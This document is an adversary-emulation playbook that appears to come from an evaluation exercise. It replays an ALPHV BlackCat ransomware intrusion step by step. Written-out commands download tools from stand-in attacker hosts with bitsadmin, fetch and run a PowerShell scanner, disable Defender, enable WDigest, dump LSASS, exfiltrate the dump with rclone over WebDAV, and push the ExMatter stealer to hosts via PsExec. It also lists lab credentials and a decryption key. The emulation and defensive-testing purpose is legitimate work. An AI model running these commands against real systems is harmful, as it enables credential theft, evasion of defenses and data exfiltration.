# ALPHV BlackCat Scenario Overview

## Step 0 - Operator Setup

### ☣️ Procedures

* Initiate an RDP session to the Kali attack host `kraken (176.59.1.18)`

* Open a terminal window and start the webdav server:
  ```
  sudo rclone serve webdav /srv/http --addr 176.59.1.18:8080
  ```

* Ensure the evalsC2server simple file server handler was started. If it hasn't been started in another terminal window, start the evalsC2server, ensuring the following
handlers are enabled:
  * Simple file server
  ```
  cd alphv_blackcat/Resources/control_server
  sudo ./controlServer -c config/msr2_handler_config.yml
  ```
  
## Step 1 - Initial Compromise and Discovery

### :microphone: Voice Track
An Access Broker gains access to a contractor organization which provides the
BlackCat affiliate with RDP access to a bastion host `kimeramon (10.20.20.11)`
within the corporate subsidiary network used by the contractor. The BlackCat
affiliate utilizes the trusted access between the compromised contractor
organization to RDP to the bastion host `kimeramon (10.20.20.11)` within the
corporate subsidiary network and download ADRecon.ps1.

The BlackCat affiliate uses ADRecon.ps1 to discover information about the
Active Directory and corporate network. After analyzing the output of ADRecon,
the BlackCat affiliate learns the following:
- NetBNMBackup server `datamon (10.20.10.122)`
- Linux KVM server `leomon (10.20.10.16)`
- Server administrators

### ☣️ Procedures

* Initiate an RDP session to the contractor workstation `raremon (10.30.10.4)`

* From the contractor workstation `raremon (10.30.10.4)`, RDP to the bastion
host `kimeramon (10.20.20.11)` using the contractor's credentials:

  | Username | Password |
  | -------- | -------- |
  | DIGIREVENGE\zorimoto | tzTVgs44isT4YxWU! |

* Within the RDP session to the bastion host `kimeramon (10.20.20.11)`, open
Edge and browse to:
    ```
    https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1
    ```
    * Click the download button to "Download raw file" to the Downloads folder

* Open a non-elevated PowerShell and execute ADRecon.ps1:
  ```
  cd Downloads
  ```
  ```
  Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
  ```
  ```
  .\ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV
  ```

* Using File Explorer, browse to the ADRecon output directory to confirm ADRecon executed successfully
  * Right click the Computers.csv, hover over `Open with` and click LibreOffice, then OK
  * Repeat the above for GroupMembers.csv

### :mag: Reference Code & Reporting
1. https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
1. https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/
1. https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent
1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | RDP to bastion host | - | T1078.002 Valid Accounts: Domain Accounts | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | RDP to bastion host | - | T1021.001 Remote Services: Remote Desktop Protocol | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | Download of ADRecon.ps1 | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1 | T1105 Ingress Tool Transfer | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Open PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Execute ADRecon Get-ADRGroupMember | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L7628 | T1069.002 Permission Groups Discovery: Domain Groups | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Execute ADRecon Get-ADRComputer | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L8948 | T1018 Remote System Discovery | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |

</details>

<br>

## Step 2 - Credential Access

### :microphone: Voice Track

The BlackCat affiliate notices SQL Server Management Studio is installed on the
bastion host and, on opening of the application, confirms the existence of a
local database modeled after the NetBNMBackup database. Using `BITSAdmin.exe`,
the BlackCat affiliate downloads `InfoStealer` using BITS and executes
`InfoStealer` against the bastion host. The output contains plaintext
credentials for the SQL admin account `netbnmadmin`.

Using the `zorimoto` credentials to authenticate, the BlackCat affiliate then
then RDPs to `datamon (10.20.10.122)` to execute `InfoStealer` against the
NetBNMBackup server.

The decrypted output contains the plaintext passwords for:
- The workstation local administrator account `windesk`
- Linux KVM server administrator account `marakawa`
- Domain admin account `ykaida.da`

Using the workstation local administrator account `windesk`, the
BlackCat affiliate uses several methods to attempt to disable anti-virus and
EDR solutions on the bastion host:
- Terminate processes and stop anti-virus services via Task Manager
- Open Windows Security and disable `Real-time protection` in "Virus & threat
protection" settings
- Open PowerShell and use the `Set-MpPreference` module to disable Defender's
`Real-time protection`

### ☣️ Procedures

* Within the RDP session, search for "SQL Server Management Studio".
    * In the "Connect to Server" prompt, select `Sql Server Authentication` for the Authentication type, if not already selected
    * Login as zorimoto (no `DIGIREVENGE`):
        | Username | Password |
        | -------- | -------- |
        | zorimoto | tzTVgs44isT4YxWU! |
    * On the lefthand side, in the `Object Explorer` expand the `Databases` folder.
    * Next expand `NetBNMBackup` > `Tables` and right-click `dbo.Credentials`, then select `Select Top 1000 Rows`.
        * Review the rows of data to ensure they are indicative of being an unencrypted, 
    encoded-only NetBNMBackup duplicate.

* Open a non-elevated `cmd.exe` as `zorimoto` then execute `BITSAdmin.exe` to download
InfoStealer from the adversary server
  ```
  bitsadmin /transfer defaultjob2 /download http://the-inator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
  ```

* Execute InfoStealer against the bastion host and confirm output contains
plaintext credentials for the SQL service account
  ```
  %TEMP%\netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!
  ```

* **Within the RDP session**, search for "Remote Desktop Connection" and
initiate an RDP connection to `datamon (10.20.10.122)` using `zorimoto`'s
credentials:
  | Username | Password |
  | -------- | -------- |
  | DIGIREVENGE\zorimoto | tzTVgs44isT4YxWU! |

* Open a non-elevated `cmd.exe` as `zorimoto` then execute `BITSAdmin.exe` to download
InfoStealer from the adversary server
  ```
  bitsadmin /transfer defaultjob /download http://the-inator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
  ```

* Execute InfoStealer against the NetBNMBackup SQL server `datamon (10.20.10.122)`
using `zorimoto`'s credentials and confirm output contains plaintext credentials
for:
    * The workstation local administrator account `windesk`
    * The Linux KVM server administrator account `marakawa`
    * The domain adminstrator account `ykaida.da`
  ```
  %TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!
  ```

* Close all Windows then **disconnect** from the RDP session to `datamon (10.20.10.122)`.
You should be returned to the RDP session to the bastion host.

* Within the RDP session, search for Task Manager, right-click and Run as Administrator,
providing the workstation local administrator account credentials when
prompted.

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

* Within Task Manager, navigate to the "Details" tab and, using the provided
list of processes, end any matching process names

* Within Task Manager, navigate to the "Services" tab and, using the provided
list of services, end any matching service names

* Within the RDP session, search for "Virus & threat protection". Select
"Manage settings" then toggle `Real-time protection` to **Off**. Provide the
workstation local administrator account credentials if prompted.

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

* Open an elevated PowerShell prompt, providing the workstation local
administrator account credentials `windesk` when prompted,
and disable Defender's `Real-time protection` via `Set-MpPreference`

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

  ```
  Set-MpPreference -DisableRealtimeMonitoring $true
  ```

### :mag: Reference Code & Reporting
1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
1. https://www.varonis.com/blog/blackcat-ransomware
1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
1. https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Create BITSAdmin download job from adversary server | - | T1197 BITS Jobs | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Download InfoStealer via BITSAdmin.exe | - | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | InfoStealer pulls passwords from local database | [cred_query](../Resources/infostealer/infostealer/sqlsharp/sql.cs#L31) | T1555 Credentials from Password Stores | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps) |
  | InfoStealer pulls passwords from NetBNMBackup | [cred_query](../Resources/infostealer/infostealer/sqlsharp/sql.cs#L31) | T1555 Credentials from Password Stores | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps) |
  | Authenticate with workstation local administrator account credentials | - | T1078.003 Valid Accounts: Local Accounts | [Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackcat) |
  | Terminate processes and services related to AV | - | T1562.001 Impair Defenses: Disable or Modify Tools | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)<br>[AT&T](https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware)<br>[BlackBerry](https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent)<br>[Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/) |
  | Disable Defender Real-time protection | - | T1562.001 Impair Defenses: Disable or Modify Tools | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)<br>[AT&T](https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware)<br>[BlackBerry](https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent)<br>[Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/) |
  | Open PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)<br>[AT&T](https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware)<br>[BlackBerry](https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent)<br>[Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/) |
  | Execute Set-MpPreference to disable Real-time protection | - | T1562.001 Impair Defenses: Disable or Modify Tools | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps)<br>[AT&T](https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware)<br>[BlackBerry](https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent)<br>[Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/) |

</details>

<br>

## Step 3 - Credential Access for Privilege Escalation

### :microphone: Voice Track
Using the plaintext credentials retrieved for the workstation local
administrator account `windesk`, the BlackCat affiliate uses
the RDP session to the bastion host `kimeramon (10.20.20.11)` to edit the
registry and enable WDigest.

The BlackCat affiliate then dumps credentials via Task Manager and exfiltrates
the dump file using `rclone`.

### ☣️ Procedures

* Within the RDP session, search for Registry Editor and right-click to Run As
Administrator, providing the workstation local administrator account
credentials when prompted

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

* Using Registry Editor, enable WDigest by browsing to 
`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`, right-click
inside the window, New > DWORD (32-bit) Value, and type `UseLogonCredential`
for the registry key value name. Ensure the type says `REG_DWORD`. Then right-
click the registry key value > Modify... then change the "Value data:" field to
`1`.

* Within the RDP session, search for Task Manager and right-click to Run As
Administrator (if not already open), providing the workstation local
administrator account credentials when prompted

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

* Using Task Manager, go to `Details`, find `lsass.exe` then right-click and click
"Create Dump File". In the pop up window, take note of the file location where the
DMP file has been created (`C:\Users\windesk\AppData\Local\Temp\lsass.DMP`)

* Within the RDP session to the bastion host `kimeramon (10.20.20.11)`, open
Edge and browse to the following link to initiate the download of rclone:
    ```
    https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip
    ```

* Go to the Downloads folder, right-click the rclone zip, click
"Extract all..." from the menu, and in the window that opens, click the Extract
button

* Search for `cmd.exe` and right-click to Run As Administrator, providing the
workstation local administrator account credentials when prompted

  | Username | Password |
  | -------- | -------- |
  | .\windesk | windesk |

* Change directory to the directory containing the rclone executable:
  ```
  cd C:\Users\zorimoto\Downloads\rclone-v1.64.0-windows-amd64\rclone-v1.64.0-windows-amd64
  ```

* Using the `cmd.exe` terminal, configure rclone for exfil via WebDAV
  ```
  rclone config
  ```
  * On entry to the rclone config console, type `n` for "New remote" then press
  Enter
  * For the name of the remote, type `webdav` then press Enter
  * For the type of storage to configure, type `49` for "WebDAV" then press
  Enter
  * For the URL of the host to connect to, type `http://luffaplex-dillpickle-inator.com:8080`
  then press Enter
  * For name of the WebDAV site, type `6` for "Other site/service or software"
  then press enter
  * For the user, press Enter to leave blank
  * For the password, press Enter to leave blank
  * For the token, press Enter to leave blank
  * For editing the advanced config, press Enter for "no"
  * Ensure the output configuration confirmation looks like the below
    ```
    - type: webdav
    - url: http://luffaplex-dillpickle-inator.com:8080
    - vendor: other
    ```
  * For keeping the "webdav" remote, type `y` for "Yes this is OK" and press
  Enter
  * You should now see `webdav` in the table of Current remotes. Type `q` to
  exit the rclone config console.

* Using the `cmd.exe` terminal, exfiltrate the DMP file using rclone
  ```
  rclone copy "C:\Users\windesk\AppData\Local\Temp\lsass.DMP" webdav:
  ```

* :arrow_right: Switch to your Kali RDP session and check for the exfiltrated
lsass.DMP file
  ```
  sudo ls -l /srv/http
  ```

### :mag: Reference Code & Reporting
1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
1. https://duo.com/decipher/prolific-affiliate-threat-groups-linked-to-blackcat-ransomware

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | Authenticate with workstation local administrator account credentials | - | T1078.003 Valid Accounts: Local Accounts | [Trend Micro](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackcat) |
  | Modify WDigest via Registry Editor | - | T1112 Modify Registry | [Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | Dump LSASS via Task Manager | - | T1003.001 OS Credential Dumping: LSASS Memory | [Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Download rclone from GitHub | - | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Exfiltrate lsass.DMP over WebDAV (HTTP) using rclone | - | T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Logpoint](https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Sophos](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/)<br>[Sophos](https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf) |

</details>

<br>

## Step 4 - Collection & Exfiltration

### :microphone: Voice Track
The BlackCat affiliate downloads `ExMatter` and a network scanning script to
identify additional targets via PowerShell using the compromised Domain Admin
account `digirevenge\ykaida.da`. Then, the BlackCat affiliate uses PsExec to execute
`ExMatter` against the identified targets.

On execution, ExMatter will:
- Retrieve the drive names of all logical drives and collect all file path
names
- Use LastWriteTime to create a queue of files for exfiltration (`ExMatter`
will only exfiltrate files larger than 1,024 bytes)
- Upload files from the queue to a remote SFTP server using the parameters:
  - Host: hide-the-secret-password-inator.net
  - Port: 22
- Compresses target files into a zip archive
- Removes traces of itself by invoking PowerShell to overwrite the first 65,536
bytes then deleting itself

After remote execution of `ExMatter` has completed, the BlackCat affiliate
executes ExMatter on the local workstation.

### ☣️ Procedures

* Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
ExMatter from the adversary server
  ```
  bitsadmin /transfer defaultjob4 /download http://the-inator.com/digirevenge/collector1.exe %TEMP%\collector1.exe
  ```

* Search for PowerShell and right-click to Run As Administrator, providing the
Domain Admin credentials for `ykaida.da` when prompted

  | Username | Password |
  | -------- | -------- |
  | digirevenge\ykaida.da | FWy9aXyXbYrbxFcE! |

* Using the elevated PowerShell, download and execute the network scanning
script to identify additional targets
  ```
  Invoke-Expression(Invoke-WebRequest 'http://the-inator.com/digirevenge/Empire-port-scan.ps1' -UseBasicParsing)
  ```
  ```
  Invoke-Portscan -Hosts "10.20.20.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}
  ```
  ```
  Invoke-Portscan -Hosts "10.20.10.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}
  ```

* Using the elevated PowerShell, execute ExMatter via PsExec against the
additional targets
  ```
  psexec -c -accepteula \\10.20.20.22,10.20.20.33,10.20.10.4,10.20.10.23,10.20.10.122,10.20.10.200 C:\Users\zorimoto\AppData\Local\Temp\collector1.exe
  ```
  * This may take some time, since ExMatter will run on each host one at a time.

* Using File Explorer, browse to `C:\Users\zorimoto\AppData\Local\Temp` and then
right-click `collector1.exe` and Run As Administrator to run ExMatter locally, providing the Domain Admin credentials
for `ykaida.da` when prompted:

  | Username | Password |
  | -------- | -------- |
  | digirevenge\ykaida.da | FWy9aXyXbYrbxFcE! |

  * :bulb: For this execution of ExMatter, ExMatter's log file will be located in `C:\Users\zorimoto\AppData\Local\Temp\EMlog.txt`

* Go to [Verifying ExMatter Execution](#verifying-exmatter-execution) and follow the steps to check that ExMatter executed successfully on the both the remote target hosts and local target host.

#### Verifying ExMatter Execution

* :arrow_right: Return to your Kali server and open up a terminal window
* Run the following command to check for uploaded zip archives:
  * If checking the original scenario steps:
    ```
    sudo ls -alR /srv/sftp/sftpupload/uploads/
    ```
* Ensure that for each of the following hostnames, there is a non-empty folder whose name begins with that hostname and has non-empty zip files:
  * alphamon
  * bakemon
  * blacknoirmon
  * butchermon
  * datamon
  * kimeramon
  * stormfrontmon
* If there are successful uploads for all hosts, proceed with the remainder of the scenario.
* ❗ If there are zip archives missing for a given host perform the remaining instructions to fetch ExMatter log files for the host(s).
  * :arrow_right: return to your RDP session to the jumpbox `homelander (116.83.1.29)`
  * From the jumpbox, RDP into the subsidiary B domain controller `blacknoirmon (10.20.10.4)` as `evals_domain_admin`:
    | Username | Password |
    | -------- | -------- |
    | digirevenge\evals_domain_admin | axi9eengei9inaeR@ |

  * Open up an administrator powershell terminal and execute the following:
    ```psh
    $paths=@("C$\Windows\System32\EMBatLog.txt", "C$\Windows\EMBatLog.txt", "C$\Windows\System32\EMlog.txt", "C$\Windows\EMlog.txt");
    $destDir="C:\Users\evals_domain_admin\xelogs";
    $zipPath="C:\Users\evals_domain_admin\xelogs.zip";
    mkdir "$destDir" -force | Out-Null;
    $hosts=@("alphamon", "bakemon", "blacknoirmon", "butchermon", "datamon", "kimeramon", "stormfrontmon");
    foreach ($targhost in $hosts) {
        $logPath = (
            $paths | %{
                $logPath = "\\$targhost\$_";
                if (Test-Path "$logPath") {
                    Write-Host "[DEBUG] Found log file $logpath on $targhost";
                    get-childitem -path "$logPath"
                }
            } | Sort-Object -Property LastWriteTime -Descending | Select-Object -First 1
        );
        if ($logPath) {
            Write-Host "[INFO] Fetching most recent log file $logPath on $targhost";
            if ("$logPath" -match "EMBatLog.txt") {
              cp "$logpath" "$destDir\dec_$targhost.log" -Force;
            } else {
              cp "$logpath" "$destDir\enc_$targhost.log" -Force;
            }
        } else {
            Write-Host "[ERROR] Failed to find log files on $targhost";
        }
    }
    Compress-Archive -Path "$destDir" -DestinationPath "$zipPath" -Force;
    scp "$zipPath" op1@176.59.1.18:/tmp/xelogs.zip;
    Remove-Item -Recurse -Force "$destDir";
    Remove-Item -Force "$zipPath";
    ```
    * When prompted, enter the credentials to Kali for SCP
      
  * Sign out of your RDP session
  * :arrow_right: Switch back to your kali terminal and execute the following to unzip and decrypt the uploaded log files:
    ```
    cd
    dirname=exmatter_logs_$(date '+%Y-%m-%dT%H-%M-%S')
    mkdir $dirname
    cd $dirname
    mv /tmp/xelogs.zip ./
    unzip xelogs.zip
    cd xelogs
    for filename in enc_*.log; do
        basename=${filename#"enc_"}
        python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i $filename -o dec_$basename -k 0370dd5addcd980e8f4b424c92d8049e99c7c7c5d09eedfcc58f6abca9e72f99 --aes-256-cbc
    done
    ```
  * For each of the hosts that were missing zip uploads, check the corresponding decrypted log file to look for errors or signs of unsuccessful/incomplete execution:
    ```
    grep -i 'error\|fail' dec_*.log
    ```
    * For hosts that had failed uploads but no matches from the `grep` command, you may need to actually go through the log files to look for signs of failure.

### :mag: Reference Code & Reporting
1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration
1. https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool
1. https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/
1. https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack

<details>
  <summary>:link: Click to expand source code links table</summary>

  > :information_source: **NOTE:** Not all techniques listed in this table
  directly map to evaluation substeps

  | Red Team Activity | Source Code Link | ATT&CK Technique | Relevant CTI Report |
  | ----------------- | ---------------- | ---------------- | ------------------- |
  | Open cmd | - | T1059.003 Command and Scripting Interpreter: Windows Command Shell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Create BITSAdmin download job from adversary SMB share | - | T1197 BITS Jobs | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Download ExMatter via BITSAdmin.exe | - | T1105 Ingress Tool Transfer | [Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Open PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
  | Authenticate with Domain Admin account credentials | - | T1078.002 Valid Accounts: Domain Accounts | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
  | Download Empire port scanner | - | T1105 Ingress Tool Transfer | [Picus](https://www.picussecurity.com/resource/black-cat-ransomware-gang) |
  | Scan ports via Empire | - | T1046 Network Service Discovery | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup)<br>[Sophos](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/)<br>[Sophos](https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf)<br>[netskope](https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack)<br>
  | Execute ExMatter using PsExec | - | T1569.002 System Services: Service Execution | [Kroll](https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool) |
  | ExMatter retrieves the drive names of all logical drives | [GetDriveInfos](../Resources/ExMatter/ExMatter/ExMatter.cs#L211) | T1083 File and Directory Discovery | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration) [Kroll](https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool)
  | ExMatter enumerates file paths | [FindTargetFiles](../Resources/ExMatter/ExMatter/ExMatter.cs#L272) | T1083 File and Directory Discovery | [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration) [Kroll](https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool)
  | ExMatter compresses files in a zip archive | [ZipFiles](../Resources/ExMatter/ExMatter/ExMatter.cs#L687) | T1560.002 Archive Collected Data: Archive via Library | [Kroll](https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool)
